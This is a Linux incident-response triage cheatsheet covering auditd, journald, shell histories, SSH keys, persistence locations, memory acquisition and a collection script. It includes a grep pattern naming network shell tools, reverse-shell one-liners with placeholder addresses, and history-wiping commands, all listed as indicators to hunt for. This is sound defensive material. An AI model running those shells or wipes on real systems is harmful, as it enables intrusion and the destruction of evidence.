# [Cheatsheet] Linux DFIR Triage 2026

> Linux IR has gotten more complex with `journald` replacing syslog and `auditd` becoming the de-facto audit standard. Here's the working triage flow.
>
> **Last updated:** 2026-05-01

---

## 🎯 The "first 5 minutes" command

```bash
#!/bin/bash
# Quick orientation on a live Linux box
hostname; uptime; uname -a
who; w; last -F | head -20
ps auxf | head -50           # process tree, full
ss -tunap | head -30          # active connections (replaces netstat)
crontab -l 2>/dev/null
ls -la /etc/cron.{d,daily,hourly,weekly,monthly}/
systemctl list-timers --all  # systemd timers (modern cron alternative)
```

---

## 🔥 The 8 highest-yield artifacts

### 1. **`auditd` logs** (`/var/log/audit/audit.log`)

If auditd is running with a sane policy, this is your **goldmine**. You get:
- Every `execve()` with full command line
- Every file open / write / rename
- Authentication events
- Network sockets

```bash
# Find recent execve syscalls
ausearch -ts recent -m EXECVE -i

# Search for specific binary execution
ausearch -ts recent -m EXECVE -i | grep -i "wget\|curl\|nc\|ncat"

# Audit rules currently in effect
auditctl -l
```

**If auditd isn't running**, recommend deploying it post-IR with at least these rules:
```
# /etc/audit/rules.d/dfir.rules
-w /etc/passwd -p wa -k passwd_changes
-w /etc/shadow -p wa -k shadow_changes
-w /etc/sudoers -p wa -k sudoers_changes
-w /root/.ssh/ -p wa -k root_ssh
-a always,exit -F arch=b64 -S execve -k all_execve
-a always,exit -F arch=b64 -S connect -F a2=16 -k network_ipv4
```

### 2. **`journald`** (replaces syslog on modern systemd distros)

```bash
# Last hour of all messages
journalctl --since "1 hour ago"

# Filter by unit
journalctl -u sshd.service --since "24 hours ago"

# Boot-by-boot (each boot is a separate stream)
journalctl --list-boots
journalctl -b 0  # current boot
journalctl -b -1  # previous boot

# Export to file (for offline analysis)
journalctl --since "7 days ago" > journald_7d.log

# Forensic-friendly export with metadata
journalctl --since "7 days ago" -o json > journald_7d.json
```

**Watch for:**
- `Failed password` bursts → SSH brute force
- `sudo: incorrect password` → privilege escalation attempts
- `systemd: Started <random-name>.service` → newly installed services
- `audit: type=1102` → audit log truncation (T1070.002 attempt)

### 3. **Bash / Zsh history**

```bash
# Per-user histories
for user in $(cut -d: -f1 /etc/passwd); do
    home=$(getent passwd $user | cut -d: -f6)
    [ -f "$home/.bash_history" ] && echo "=== $user ===" && cat "$home/.bash_history"
    [ -f "$home/.zsh_history" ] && echo "=== $user (zsh) ===" && cat "$home/.zsh_history"
done

# Root's history (most attacker activity ends up here)
cat /root/.bash_history /root/.zsh_history 2>/dev/null
```

**Attackers who know what they're doing** will:
- `unset HISTFILE` (no logging this session)
- `export HISTFILE=/dev/null`
- `history -c; history -w` (clear and overwrite)

If history is suspiciously empty when other evidence shows activity → that itself is signal.

### 4. **SSH activity**

```bash
# All SSH events (auth log)
grep -E "sshd" /var/log/auth.log /var/log/secure 2>/dev/null | tail -100

# Successful logins only
grep "Accepted" /var/log/auth.log

# What keys are authorized?
for user in $(cut -d: -f1 /etc/passwd); do
    home=$(getent passwd $user | cut -d: -f6)
    [ -f "$home/.ssh/authorized_keys" ] && echo "=== $user ===" && cat "$home/.ssh/authorized_keys"
done

# Last logins
last -F | head -50
lastb -F | head -20  # failed logins
```

**T1098.004 — adding to authorized_keys** is a top persistence technique. Always check.

### 5. **Crontab + systemd timers**

```bash
# Per-user cron
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u $user -l 2>/dev/null | grep -v "^#" | grep -v "^$" | sed "s/^/$user: /"
done

# System-wide cron
ls -la /etc/cron.{d,daily,hourly,weekly,monthly}/
cat /etc/crontab
ls -la /var/spool/cron/

# systemd timers (the new cron)
systemctl list-timers --all
ls -la /etc/systemd/system/*.timer 2>/dev/null
```

### 6. **Loaded kernel modules** (rootkit hunt)

```bash
lsmod | head
# Compare against known-good baseline if available

# Modules in suspicious paths
find /lib/modules/$(uname -r) -name "*.ko" -newer /etc/passwd

# Check for hidden modules (rkhunter / chkrootkit if installed)
chkrootkit 2>/dev/null
rkhunter --check --skip-keypress 2>/dev/null
```

### 7. **Persistence locations beyond cron**

```bash
# systemd services
systemctl list-unit-files --type=service --state=enabled

# init.d (legacy but still used)
ls -la /etc/init.d/

# Profile / shell startup files
ls -la /etc/profile /etc/profile.d/ /etc/bash.bashrc
for user in $(cut -d: -f1 /etc/passwd); do
    home=$(getent passwd $user | cut -d: -f6)
    [ -d "$home" ] && ls -la "$home"/.{bashrc,bash_profile,profile,zshrc} 2>/dev/null
done

# LD_PRELOAD shenanigans
cat /etc/ld.so.preload 2>/dev/null
env | grep -i preload

# /etc/rc.local (legacy startup hook)
cat /etc/rc.local 2>/dev/null
```

### 8. **Web / app logs** (if web server)

```bash
# Apache
tail -1000 /var/log/apache2/access.log /var/log/httpd/access_log 2>/dev/null

# Nginx
tail -1000 /var/log/nginx/access.log

# Look for webshell drops + suspicious PHP / JSP / ASPX
find /var/www -newer /etc/passwd -name "*.php" -o -name "*.jsp" -o -name "*.aspx"
```

---

## 🎯 The 2026 LOLBins / LOLScripts to grep for

```bash
# Living-off-the-land binaries used in modern Linux intrusions
SUSPICIOUS_PATTERNS="(curl|wget|nc|ncat|socat|python3 -c|perl -e|bash -i|/dev/tcp|base64 -d|xxd -r|busybox)"

# Search auditd
ausearch -ts recent -m EXECVE -i | grep -E "$SUSPICIOUS_PATTERNS"

# Search journald
journalctl --since "7 days ago" | grep -E "$SUSPICIOUS_PATTERNS"

# Search bash histories
grep -rE "$SUSPICIOUS_PATTERNS" /root/.bash_history /home/*/.bash_history 2>/dev/null
```

**Hot 2025-2026 patterns:**
- `bash -i >& /dev/tcp/<ip>/<port> 0>&1` — bash reverse shell (classic, still works)
- `python3 -c 'import socket,os,pty;...'` — Python reverse shell
- `nc -e /bin/sh <ip> <port>` — netcat backdoor (some `nc` builds removed `-e`)
- `socat tcp-connect:<ip>:<port> exec:bash,pty,stderr,setsid,sigint,sane` — socat reverse
- `curl <url> | bash` — pipe-to-shell (always indicates 'someone trusted a URL too much')

---

## 📁 Where evidence actually lives

| Artifact | Path |
|---|---|
| auditd | `/var/log/audit/audit.log[.N]` |
| journald | `/var/log/journal/` (binary) — use `journalctl -D <path>` for offline |
| syslog | `/var/log/syslog`, `/var/log/messages` |
| auth | `/var/log/auth.log` (Debian/Ubuntu), `/var/log/secure` (RHEL/CentOS) |
| kernel | `/var/log/kern.log`, `dmesg` |
| wtmp / btmp | `/var/log/wtmp` (logins), `/var/log/btmp` (failed logins) — binary; `last -f`, `lastb -f` |
| utmp | `/var/run/utmp` (currently logged in) — `who`, `w` |
| Bash history | `~/.bash_history` per user |
| zsh history | `~/.zsh_history` per user |
| MySQL history | `~/.mysql_history` |
| Redis history | `~/.rediscli_history` |

---

## 🛠️ Linux memory acquisition

```bash
# Method 1 — AVML (Microsoft, recommended)
wget https://github.com/microsoft/avml/releases/latest/download/avml
chmod +x avml
sudo ./avml memory.lime

# Method 2 — LiME (Linux Memory Extractor)
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src && make
sudo insmod lime.ko "path=/path/memory.lime format=lime"

# Method 3 — /dev/mem (won't work on most modern kernels due to STRICT_DEVMEM)
# Only useful in legacy contexts
```

Then analyze with [Volatility 3](./[Cheatsheet]%20memory-forensics-vol3.md):
```bash
vol -f memory.lime linux.bash.Bash      # in-memory bash history (CAN survive history wipe)
vol -f memory.lime linux.pslist.PsList
vol -f memory.lime linux.envars.Envars  # LD_PRELOAD?
```

---

## ⚙️ The 30-minute Linux triage

```bash
#!/bin/bash
OUT=~/triage_$(hostname)_$(date +%Y%m%d_%H%M%S)
mkdir -p $OUT

# 1. Orientation
hostname > $OUT/host.txt
uname -a >> $OUT/host.txt
uptime >> $OUT/host.txt
date >> $OUT/host.txt

# 2. Who/what is here
who > $OUT/who.txt
last -F > $OUT/last.txt
lastb -F > $OUT/lastb.txt
ps auxf > $OUT/ps.txt
ss -tunap > $OUT/sockets.txt

# 3. Auth events
cp /var/log/auth.log $OUT/ 2>/dev/null
cp /var/log/secure $OUT/ 2>/dev/null

# 4. auditd (if present)
[ -f /var/log/audit/audit.log ] && cp /var/log/audit/audit.log $OUT/

# 5. journald (last 7d)
journalctl --since "7 days ago" > $OUT/journald_7d.log
journalctl --since "7 days ago" -o json > $OUT/journald_7d.json

# 6. Persistence inventory
crontab -l > $OUT/crontab.txt 2>/dev/null
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u $user -l 2>/dev/null | grep -v "^#\|^$" | sed "s/^/$user: /"
done > $OUT/all_crontabs.txt
cp -r /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ $OUT/cron_dirs/ 2>/dev/null
systemctl list-timers --all > $OUT/timers.txt
systemctl list-unit-files --type=service --state=enabled > $OUT/services_enabled.txt

# 7. SSH state
mkdir $OUT/ssh
for user in $(cut -d: -f1 /etc/passwd); do
    home=$(getent passwd $user | cut -d: -f6)
    [ -d "$home/.ssh" ] && cp -r "$home/.ssh" "$OUT/ssh/$user/" 2>/dev/null
done

# 8. Bash histories
mkdir $OUT/histories
for user in $(cut -d: -f1 /etc/passwd); do
    home=$(getent passwd $user | cut -d: -f6)
    [ -f "$home/.bash_history" ] && cp "$home/.bash_history" "$OUT/histories/${user}_bash"
    [ -f "$home/.zsh_history" ]  && cp "$home/.zsh_history"  "$OUT/histories/${user}_zsh"
done

# 9. Kernel state
lsmod > $OUT/lsmod.txt
dmesg > $OUT/dmesg.txt
cat /etc/ld.so.preload > $OUT/ld_so_preload.txt 2>/dev/null

# 10. Hash everything for chain-of-custody
find $OUT -type f -exec sha256sum {} \; > $OUT/SHA256SUMS
echo "Triage complete: $OUT"
```

---

## 📚 References

- **Hal Pomeranz** (deer-run.com) — Linux IR talks; `auditd` deployment templates
- **`auditd` docs** — `man auditctl`, `man auditd.conf`
- **Eric Conrad** — DeepBlueCLI for Windows but his Linux IR talks are excellent too
- **GTFOBins** — [gtfobins.github.io](https://gtfobins.github.io) — what each Linux binary can be abused to do
- **The DFIR Report** — many cases now include Linux pivots (ransomware groups targeting ESXi, etc.)
- **CISA — #StopRansomware (BlackSuit, Akira)** — Linux ESXi locker patterns

---

## ↩️ Back

← [Resources/](../Resources/) · [GitNote root](../README.md)
